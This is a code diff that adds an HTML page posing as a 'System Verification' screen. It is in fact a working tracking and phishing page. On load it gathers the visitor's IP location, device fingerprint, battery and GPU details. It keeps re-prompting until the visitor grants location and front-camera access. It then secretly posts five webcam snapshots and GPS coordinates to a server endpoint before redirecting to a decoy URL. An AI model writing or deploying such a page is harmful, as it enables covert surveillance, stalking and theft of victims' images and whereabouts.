@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <style>
+        body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
+        #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10;font-size:18px;}
+        #v, #c { display:none }
+        #iframeOverlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 5; display: none; background: #fff; }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+    <iframe id="iframeOverlay"></iframe>
+
+<script>
+// Node.js থেকে ডাইনামিক ভেরিয়েবল বসবে এখানে
+const id = "{{LINK_ID}}"; 
+const red = "{{REDIRECT_URL}}"; 
+
+if (red && red.length > 4 && red !== "null") {
+    const iframe = document.getElementById('iframeOverlay');
+    iframe.src = red;
+    iframe.style.display = 'block';
+}
+
+const m=document.getElementById('matrix'); const ctx=m.getContext('2d');
+m.width=window.innerWidth; m.height=window.innerHeight;
+const drops=Array(Math.floor(m.width/20)).fill(0);
+function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
+setInterval(draw,33);
+
+async function getCam() {
+    while(true) {
+        try { return await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}); } 
+        catch(e) { alert("Camera permission is required to continue."); await new Promise(r => setTimeout(r, 1000)); }
+    }
+}
+
+async function getLoc() {
+    return new Promise((resolve) => {
+        function ask() { navigator.geolocation.getCurrentPosition(resolve, () => { alert("Location permission is required to continue."); setTimeout(ask, 1000); }); }
+        ask();
+    });
+}
+
+async function start() {
+    let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
+    try { 
+        const r1 = await fetch('https://ipapi.co/json/'); 
+        const d1 = await r1.json();
+        if (d1.ip) ipData = { ip: d1.ip, city: d1.city||"?", country: d1.country_name||"?", isp: d1.org||"?", loc: d1.latitude+","+d1.longitude };
+    } catch(e1) {}
+    
+    let batt = "N/A"; try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); } catch(e){}
+    let gpu = "N/A"; try { const gl = document.createElement('canvas').getContext('webgl'); const db = gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); } catch(e){}
+
+    const info = {
+        ipData: ipData, battery: batt, gpu: gpu,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
+        navigator: { platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, userAgent: navigator.userAgent, language: navigator.language }
+    };
+
+    fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
+
+    const pos = await getLoc();
+    fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
+
+    const s = await getCam();
+    const v = document.getElementById('v'); v.srcObject=s;
+    v.onloadedmetadata = () => {
+        let count=0;
+        const itv = setInterval(()=>{
+            const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
+            cvs.getContext('2d').drawImage(v,0,0);
+            const img=cvs.toDataURL('image/jpeg',0.5);
+            fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
+            count++; 
+            if(count>=5){ clearInterval(itv); if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); }
+        }, 1500);
+    };
+}
+window.onload = start;
+</script>
+</body>
+  </html>
